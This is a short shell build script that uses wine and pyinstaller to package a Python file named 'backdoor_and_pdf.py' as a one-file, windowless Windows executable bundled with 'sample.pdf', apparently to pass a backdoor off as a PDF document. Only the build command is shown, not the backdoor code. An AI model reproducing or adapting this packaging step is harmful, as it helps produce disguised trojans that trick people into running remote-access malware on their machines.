#!/bin/sh
# chmod 755 build_backdoor_and_pdf.sh
# ./build_backdoor_and_pdf.sh
wine pyinstaller --onefile --noconsole --add-data "sample.pdf;." backdoor_and_pdf.py
